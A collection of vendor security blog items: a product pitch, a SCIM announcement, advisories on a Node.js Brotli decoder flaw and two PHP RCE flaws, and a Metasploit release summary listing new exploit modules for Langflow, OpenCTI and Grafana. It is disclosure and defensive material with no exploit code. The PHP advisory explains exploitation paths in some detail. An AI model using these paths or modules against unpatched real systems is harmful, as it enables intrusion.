  • Rapid7 has predefined exports in Cyberscope XML reporting format for seamless ingestion into reports for CyberScope submissions as per CyberScope Automated Data Feeds Submission Manual published by the U.S. Office of Management and Budget.

  • Built-in audit trail to demonstrate adherence with BOD 22-01. 

Why agencies and contractors choose InsightGovCloud

Rapid7 InsightGovCloud is designed to support the rigorous requirements of state and local government agencies. The benefits are many, but among the top are its deployment into a FedRAMP Authorized environment – meeting federal security and compliance requirements at every level – its seamless integration into an existing security ecosystem, and its out-of-the-box alignment with CISA and CMMC security mandates. 

Agencies and contractors enjoy a future-proof tool in that Rapid7 is continuously updating against the ever-growing KEV catalog, as well as unmatched visibility and control through leadership-friendly reporting. Get to know the platform better here.

items.title: Simplify User Access Management with SCIM on Rapid7 Command Platform
items.summary:
Managing access to security tools shouldn't require another manual process. As organizations grow, keeping user accounts and permissions up to date becomes increasingly complex. Employees join, change roles, and leave, creating a constant need to update access across applications.

When these processes rely on manual administration, delays and oversights can introduce unnecessary work and security risk.

Rapid7 Command Platform now supports System for Cross-domain Identity Management (SCIM), enabling customers to automate user provisioning and deprovisioning through their existing identity provider (IdP).

This helps organizations reduce administrative overhead, maintain more consistent access controls, and manage identity at scale.

Automate user access throughout the employee lifecycle

SCIM is an open standard that enables identity providers, such as Okta, to automatically manage user accounts in connected applications.

With SCIM enabled, Rapid7 Command Platform customers can:

  • Automate provisioning: Create accounts when employees join or need access.

  • Keep user information current: Synchronize supported user attributes as information changes.

  • Simplify offboarding: Automatically deactivate accounts when users no longer require access.

  • Manage groups at scale: Synchronize group membership to help streamline access administration.

Rather than manually updating accounts in Command Platform, administrators can manage supported identity lifecycle changes through their existing IdP.

Less administration, more consistent access control

Consider a common scenario: An employee leaves the organization. Without automated provisioning, an administrator must remember to deactivate that employee's access across their applications. If an account is missed, it could remain active longer than intended.

With SCIM, changes made in the organization's identity provider can automatically trigger corresponding account updates in Command Platform.

By introducing SCIM at the platform level, Rapid7 helps organizations:

  • Reduce operational overhead by eliminating repetitive account-management tasks.

  • Strengthen access governance by reducing stale accounts and keeping user information aligned with identity provider policies.

  • Scale more efficiently by centralizing identity lifecycle management for supported Command Platform applications.

For organizations with security and compliance requirements, these capabilities also help support consistent onboarding and offboarding processes.

Get started with SCIM

SCIM support is now available to Rapid7 Command Platform customers.

Platform administrators can configure SCIM through Command Platform's SSO settings using their existing identity provider. SCIM is disabled by default and requires configuration before automated provisioning begins.

For prerequisites and setup instructions, visit the Command Platform SCIM integration documentation.

items.title: CVE-2026-111497: Critical out-of-bounds write in the Node.js Brotli decoder
items.summary:
Overview

On October 21, 2026, the Node.js Project published a security advisory for CVE-2026-111497, an out-of-bounds write in the Brotli decoder bundled with Node.js. The vulnerability affects the Node.js 26.x, 24.x, and 22.x release lines. Node.js rates the issue High, while Google, the CVE Numbering Authority (CNA), gives it a critical CVSSv4 score of 9.2.

An attacker who can supply Brotli data that an application decompresses with node:zlib can corrupt process memory. According to Node.js, this corruption can lead to a process crash, disclosure of sensitive process memory, or remote code execution. Exposure therefore depends on whether an application passes attacker-controlled compressed data to the affected decoder.

On October 27, 2026, CVE-2026-111497 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. Given the vulnerability's potential to disclose memory or enable remote code execution (RCE), Rapid7 recommends that organizations prioritize remediation.

Technical overview

CVE-2026-111497 is classified as an out-of-bounds write (CWE-787) and an unchecked return value (CWE-252). Per the vendor advisory, the decoder handled an invalid Brotli block switch as a temporary need for more input instead of a permanent format error. The streaming decoder then continued appending input bytes to an eight-byte internal buffer, allowing malformed input to write beyond the buffer and corrupt process memory.

The vulnerability originates in Google Brotli, which the affected Node.js release lines bundle as a dependency. The CVE record identifies affected upstream Brotli ranges on all platforms as versions 1.0.3 before 1.0.10, 1.1.0 before 1.1.1, and 1.2.0 before 1.2.1. The Node.js Project remediated its bundled decoder in the fixed Node.js releases listed below.

Because CVE-2026-111497 affects the upstream Google Brotli decoder, its reach is not limited to Node.js. Vendor and project advisories have also identified affected implementations in Bun, Python's Brotli and brotlicffi packages, .NET, Envoy and Istio, brotli4j, and operating-system packages. Affected versions, default exposure, and remediation vary by product; the presence of an affected decoder does not by itself establish exposure unless an application processes attacker-controlled Brotli data. Organizations should consult the relevant downstream vendor or distribution advisories to identify affected versions, assess exposure, and determine appropriate remediation.

Mitigation guidance

Vendor-supplied security updates are available to remediate CVE-2026-111497. Organizations running an affected Node.js release should upgrade on an urgent basis, outside of normal patch cycles:

  • Node.js 22.x releases before 22.23.4 are affected; upgrade to 22.23.4 or later.

  • Node.js 24.x releases before 24.22.1 are affected; upgrade to 24.22.1 or later.

  • Node.js 26.x releases before 26.12.1 are affected; upgrade to 26.12.1 or later.

The vendor states that end-of-life Node.js release lines should also be treated as affected when a security release occurs. Organizations using an end-of-life release should migrate to a supported, fixed release line. Node.js has not published a vendor-supported workaround; if an immediate upgrade is not possible, Rapid7 recommends restricting or disabling application paths that decompress untrusted Brotli data as a temporary exposure-reduction measure.

For the latest mitigation guidance, please refer to the Node.js security advisory.

Rapid7 customers

Exposure Command, Vulnerability Management, and Nexpose

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-111497 with an authenticated vulnerability check for Linux, macOS, and Windows, available in the October 26 content release.

Updates

  • October 26, 2026: Initial publication.

  • October 26, 2026: Updated the Exposure Command, Vulnerability Management, and Nexpose section to reflect coverage availability.
  • October 27, 2026: Updated Overview to add a reference to CVE-2026-111497 being added to the CISA KEV list.

items.title: Metasploit Wrap Up: Langflow, MongoDB, and More
items.summary:
This release adds multiple new modules, and 6 of those modules point at a single target: Langflow, the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425, with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die.

New Module Content (11)

4gaBoards Mass User Information Disclosure (CVE-2026-53959)

Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub)

Type: Auxiliary

Pull request: #21831 contributed by anirbala98

Path: gather/4gaboards_users_info_disclosure_cve_2026_53959

CVE reference: CVE-2026-53959

Description: Adds a module that exploits CVE-2026-53959, a broken access control vulnerability allowing mass user information disclosure in 4gaBoards versions 3.3.8 and below. The application's /api/users REST endpoint lets any authenticated user retrieve a full, unpaginated list of every user in the system. Missing authorization checks allow an attacker to retrieve the email, phone, organization, name, and SSO email addresses (ssoGoogleEmail, ssoGithubEmail, and others) of every user.

Langflow AI Authentication Bypass (CVE-2026-93680)

Author: Richard Howe

Type: Auxiliary

Pull request: #21942 contributed by rmhowe425

Path: gather/langflow_auth_bypass_cve_2026_93680

CVE reference: CVE-2026-93680

Description: Adds a new auxiliary module that leverages CVE-2026-93680, an authentication bypass vulnerability impacting Langflow versions 1.5.0 through 1.11.4.

Apache Solr Version Scanner

Author: h00die

Type: Auxiliary

Pull request: #22006 contributed by h00die

Path: scanner/http/apache_solr_version

Description: Adds a new scanner that identifies Apache Solr and reports its version.

MongoDB Auxiliary Module Suite

Authors: h00die and prithvee07

Type: Auxiliary

Pull request: #21785 contributed by h00die

Description: Adds the mongodb_version, mongodb_schemadump, and mongodb_hashdump auxiliary modules, and updates the existing mongodb_login module.

This PR adds the following modules:

  • scanner/mongodb/mongodb_hashdump
  • scanner/mongodb/mongodb_schemadump
  • scanner/mongodb/mongodb_version

OpenCTI Authentication Bypass and Notifier EJS Remote Code Execution

Author: Jean-Marie Bourbon

Type: Exploit

Pull request: #21826 contributed by kmkz

Path: linux/http/opencti_notifier_rce

CVE references: CVE-2026-27960 and CVE-2026-39980

Description: Adds a new exploit module for OpenCTI that chains CVE-2026-27960 and CVE-2026-39980 to achieve unauthenticated remote command execution.

Grafana SQL Expressions DuckDB Command Injection (CVE-2024-9264)

Author: Özcan Ersan (@ozcanpng)

Type: Exploit

Pull request: #21901 contributed by ozcanpng

Path: multi/http/grafana_sql_expressions_rce_cve_2024_9264

CVE reference: CVE-2024-9264

Description: Adds an authenticated exploit module for CVE-2024-9264, a DuckDB command injection in Grafana SQL Expressions.

Langflow AI Code Validation Authenticated RCE (CVE-2026-7873)

Authors: Richard Howe and n0k0

Type: Exploit

Pull request: #21877 contributed by rmhowe425

Path: multi/http/langflow_auth_rce_cve_2026_7873

CVE reference: CVE-2026-7873

Description: Adds a new exploit module that detects and exploits CVE-2026-7873, an authenticated RCE vulnerability impacting Langflow versions 1.0.0 through 1.10.0.

Langflow AI Authenticated Command Injection (CVE-2026-93674)

Author: Richard Howe

Type: Exploit

Pull request: #21939 contributed by rmhowe425

Path: multi/http/langflow_auth_command_injection_cve_2026_93674

CVE reference: CVE-2026-93674

Description: Adds a new exploit module that detects and exploits CVE-2026-93674, an authenticated blind command injection vulnerability impacting Langflow versions 1.5.0 through 1.9.0.

Langflow AI Validate Code Injection Unauth RCE (CVE-2026-0768)

Authors: Peter Girnus and Richard Howe

Type: Exploit

Pull request: #21864 contributed by rmhowe425

Path: multi/http/langflow_unauth_rce_cve_2026_0768

CVE reference: CVE-2026-0768

Description: Adds a new exploit module that detects and exploits CVE-2026-0768, an unauthenticated remote code execution vulnerability impacting Langflow version 1.4.2.

Langflow AI Custom Component Eval Injection Unauth RCE (CVE-2026-0769)

Authors: Peter Girnus and Richard Howe

Type: Exploit

Pull request: #21867 contributed by rmhowe425

Path: multi/http/langflow_unauth_rce_cve_2026_0769

CVE reference: CVE-2026-0769

Description: Adds a new exploit module that detects and exploits CVE-2026-0769, an unauthenticated RCE vulnerability impacting Langflow version 1.3.2.

Langflow AI Public Flow Build Unauth RCE (CVE-2026-10134)

Author: Richard Howe

Type: Exploit

Pull request: #21875 contributed by rmhowe425

Path: multi/http/langflow_unauth_rce_cve_2026_10134

CVE reference: CVE-2026-10134

Description: Adds a new exploit module that detects and exploits CVE-2026-10134, an unauthenticated remote code execution vulnerability impacting Langflow versions 1.0.0 through 1.9.3.

Enhancements and Features (3)

  • #20944 from Nayeraneru - Adds specs to ensure the mkdir post API behaves consistently.
  • #21915 from vjonline - Consolidates reverse handler bind address handling into a shared Msf::Handler::Reverse::Bind module.
  • #22041 from adfoster-r7 - Adds multiple Meterpreter improvements. The Windows Meterpreter has a major reflective-loader/IAT-import reduction, as well as improved WinAPI/error handling, and MinGW/CMake build refinements. The Python Meterpreter has improvements to Windows stat support and FreeBSD process listing. The PHP Meterpreter resolves PHP UDP channel read bugs. All Meterpreters now align on recursive mkdir -p capabilities.

Bugs Fixed (6)

  • #21490 from h00die - Fixes a crash when fingerprinting HTTP services that contained null bytes.
  • #21979 from adfoster-r7 - Adds additional HTTP redirect checks to multiple modules.
  • #21994 from adfoster-r7 - Adds additional FTP PASV IP validation checks to multiple modules.
  • #22001 from Suryanshuv14 - Fixes DirtyClone module metadata and a typo.
  • #22002 from mjatin2007 - Fixes leaking TCP sockets and file descriptors when the MSSQL Login Scanner module or the MSSQL session type is used.
  • #22014 from cgranleese-r7 - Fixes false positives in the detection logic of the auxiliary/gather/hikvision_info_disclosure_cve_2017_7921, auxiliary/gather/magento_xxe_cve_2024_34102, and auxiliary/scanner/http/elasticsearch_traversal modules.

Documentation

You can find the latest Metasploit documentation on our docsite at docs.metasploit.com.

Get it

As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:

  • Pull Requests 6.5.6…6.5.8
  • Full diff 6.5.6…6.5.8

If you are a git user, you can clone the Metasploit Framework repo (master branch) for the latest. To install fresh without using git, you can use the open-source-only Nightly Installers or the commercial edition Metasploit Pro

items.title: CVE-2026-109618 and CVE-2026-109619: Critical Unauthenticated Remote Code Execution in PHP
items.summary:
Overview

On October 21, 2026, the PHP project announced security releases for two critical vulnerabilities in PHP. CVE-2026-109618 can corrupt memory during out-of-memory (OOM) handling, while CVE-2026-109619 is a use-after-free flaw involving state retained between requests. Both have a CVSSv4 score of 9.2 and both can allow for unauthenticated remote code execution (RCE) with the web worker's privileges.

CVE

CVSSv4

Description

CVE-2026-109618

9.2 (Critical)

RCE via OOM corruption

CVE-2026-109619

9.2 (Critical)

RCE via stale global state

All installations serving web requests are at risk, including PHP-FPM, Apache mod_php, php-cgi, FrankenPHP, and LiteSpeed. The vendor considers mod_php the highest risk because exploitation can succeed before any application code runs.

The advisories report that a successful RCE exploit was developed during research, including achieving RCE against Apache mod_php and PHP-FPM through different attack paths. As of October 21, 2026, there are multiple indications that this research is being independently reproduced, and a viable exploit is expected to be made public soon.

Due to the extremely high deployment of PHP based web applications, exploitation in-the-wild is expected. Rapid7 recommends updating affected installations on an emergency basis, outside of normal patch cycles.

Multiple public proof-of-concept (PoC) exploits for CVE-2026-109618 and CVE-2026-109619 are now available. Rapid7 researchers have reviewed these and observe that each demonstrates RCE only against a specific combination of operating system, PHP version, and web server, and none appears to be broadly reliable. Rapid7’s own research supports this. Our attempts so far have produced a working exploit only under narrow lab conditions, and exploitation depends on assumptions that are unlikely to hold on internet-facing instances. We are continuing to investigate approaches that could improve portability, but have not yet developed a reliable, general-purpose exploit. Rapid7 has not observed exploitation in the wild, though there are multiple reports of exploitation attempts, which is expected for a vulnerability of this profile. The situation is evolving quickly, and a more portable exploit technique could emerge at any time. The current difficulty of reliable exploitation should be treated as a window to patch rather than a reason to delay, and Rapid7 continues to recommend updating affected installations on an emergency basis.

Update #1: On October 26, 2026, CVE-2026-109618 and CVE-2026-109619 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. CISA set the remediation due date to October 29, 2026, for affected Federal Civilian Executive Branch agencies and directs them to follow the associated BOD 26-04 forensic triage requirements. Rapid7 continues to recommend updating affected installations on an emergency basis and investigating for prior compromise.

Technical overview

CVE-2026-109618: Memory corruption during OOM handling

According to the OOM advisory, PHP can abruptly abandon request processing when a memory allocation fails. If internal request data is only partly initialized, that exit can leave invalid data for request cleanup to use. Crafted multipart requests, used for forms and file uploads, can exhaust memory even when their size appears to meet PHP's configured limits. Application operations that allocate memory in response to attacker input can also trigger OOM.

Apache mod_php runs cleanup even when request startup fails, enabling the demonstrated attack before application code executes. The advisory reports RCE over HTTP with default PHP input and memory limits, including multi-worker prefork deployments. PHP-FPM terminates a worker when startup fails, preventing that particular sequence. Source analysis supports FPM susceptibility after successful startup, but the advisory reports no complete FPM exploit for this CVE. Exploit portability and reliability depend on the PHP build, extensions, frontend behavior, and memory layout.

CVE-2026-109619: Use after free across requests

PHP can reuse a worker process to handle multiple HTTP requests. The stale-state advisory describes internal state that still points to memory freed at the end of an earlier request. A later request handled by the same worker can access that stale value before normal initialization clears it. Fatal errors, including memory exhaustion and execution timeouts, can interrupt state cleanup; some nonfatal diagnostics during shutdown can also repopulate error state after it was reset.

The advisory confirms RCE against mod_php through PHP 8.5's fatal error backtrace feature, when fatal_error_backtraces is enabled (the default), where a later initialization diagnostic accesses stale backtrace state. It also confirms session lifecycle RCE against mod_php and FPM. Session upload progress, PHP's upload-tracking feature, is enabled by default and can act as an early consumer of stale session or decoder state before normal initialization; reaching this consumer does not itself require an application call to session_start().

The validated FPM session path requires a suitable application operation to leave state behind after successful startup, followed by a fatal error and another request that consumes the stale state through session upload progress. Both requests must reach the same worker. Multiple workers and worker recycling can reduce success per request, but do not eliminate the condition.

Mitigation guidance

PHP has released fixes for both vulnerabilities. Organizations should prioritize updating to the appropriate fixed release or a vendor package containing both complete patches. The PHP advisories list these affected and fixed versions:

  • PHP 8.2 releases before 8.2.35: Update to 8.2.35

  • PHP 8.3 releases before 8.3.36: Update to 8.3.36

  • PHP 8.4 releases before 8.4.27: Update to 8.4.27

  • PHP 8.5 releases before 8.5.12: Update to 8.5.12

Linux distributions and long-term support vendors received patches in advance; check your vendor for updated packages. PHP 8.1 and older no longer receive routine upstream updates. For this incident, PHP has supplied limited source backports for PHP 7.4, 8.0, and 8.1. Organizations running older branches should obtain a vendor fix, use the source backports described in the PHP announcement, or upgrade to a supported version. PHP also warns that rpms.remirepo.net will not have updates on October 21, 2026, and urges its users to switch to distribution packages or build from source.

Note that an update containing both complete fixes is the only complete remediation. 

PHP's temporary configuration measures reduce exposure to specific paths and require careful deployment:

  • For the OOM issue, enforce memory_limit=-1 administratively, such as through FPM pool or Apache configuration that applications cannot override. This disables PHP's per-request memory cap and removes the predictable PHP-limit failure used by the confirmed exploit. An underlying allocation failure can still reach the vulnerable path. Restart every worker and verify that no pool, directory, or application setting restores a finite limit.

  • For the session lifecycle path, set session.upload_progress.enabled=0 in php.ini, an FPM pool, or server configuration that applies before request parsing, then restart every worker. Application-level ini_set() and FPM .user.ini are too late. This addresses the confirmed session paths only.

  • On PHP 8.5, set fatal_error_backtraces=0 administratively and restart every worker. This addresses the confirmed fatal backtrace path only; other retained state remains a concern.

Disabling PHP's memory cap makes independent resource controls particularly important. PHP recommends post_max_size=8M where uploads are unnecessary or post_max_size=32M where they are needed, with upload_max_filesize below that limit. At the frontend, bound decoded request size, input and multipart counts, headers per part, and nesting depth, including requests without a usable Content-Length. If the application does not use multipart data, block those requests before they reach PHP.

Container or cgroup memory limits are also incomplete: allocation failures remain possible, and enforcement can kill the master process and all workers unless workers are isolated. Do not substitute RLIMIT_AS or RLIMIT_DATA, which can trigger the vulnerable allocation-failure path.

For stale-state exposure, correct invalid or deprecated per-request settings and attacker-reachable fatal errors or timeouts. Hiding diagnostics through error_reporting, display_errors, log_errors, or @ does not prevent stale-state access. The absence of relevant log entries is not proof that an installation is safe.

For the latest mitigation guidance, refer to PHP's OOM corruption advisory and stale global state advisory.

Rapid7 customers

To learn how to use Rapid7 capabilities to find systems affected by these vulnerabilities and for answers to common questions, read the PHP2Shell documentation.

For Rapid7 Customers with questions regarding Rapid7 products and their usage of PHP please consult this page.

Exposure Command, Vulnerability Management, and Nexpose

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-109618 and CVE-2026-109619 with remote unauthenticated vulnerability checks, available in a dedicated release that followed the regular October 21 content release.

Rapid7 has also released authenticated scan checks for both the Scan Engine and the Agent for CVE-2026-109618 and CVE-2026-109619 as part of the October 22 content release.

Authenticated, package-based checks are now available for a variety of Linux distributions.  These checks evaluate installed distribution packages, so they can recognize backported fixes that keep the original upstream PHP version number. Run an authenticated scan with this content release to use them. For the full list of checks and supported distribution versions, read Rapid7’s PHP2Shell documentation, where package-based coverage for other distributions will be added as their fixes are published.

In a dedicated October 23 content release following the regular release, Rapid7 has released coverage for CVE-2026-115560, published on October 23 by the PHP Foundation. A mitigation technique is available, but no patch has yet been published. Exploitation of CVE-2026-115560 relies on non-standard configuration.

Current scope for authenticated coverage: Windows, macOS and Linux. Remote unauthenticated coverage provides coverage regardless of web-server OS.

Velociraptor

A Velociraptor Artifact Generic.Applications.PHPInventory is available to inventory PHP installations on Windows, Linux and macOS for remediation scoping. This artifact allows for the collection of package versions, common binary and module paths, and running PHP processes.

Updates

  • October 21, 2026: Initial publication.

  • October 21, 2026: Updated to reflect availability of vulnerability checks.

  • October 22, 2026: Updated the Overview section to include Rapid7’s findings on a PoC and the Rapid7 Customers section to include a link to the FAQ documentation.

  • October 23, 2026: Updated the Exposure Command, Vulnerability Management, and Nexpose section to describe authenticated coverage, Linux distro backported coverage, and more.

  • October 27, 2026: Updated the Overview to note that CVE-2026-109618 and CVE-2026-109619 were added to the CISA KEV catalog. Updated Rapid7 customers section to reflect added Windows support.
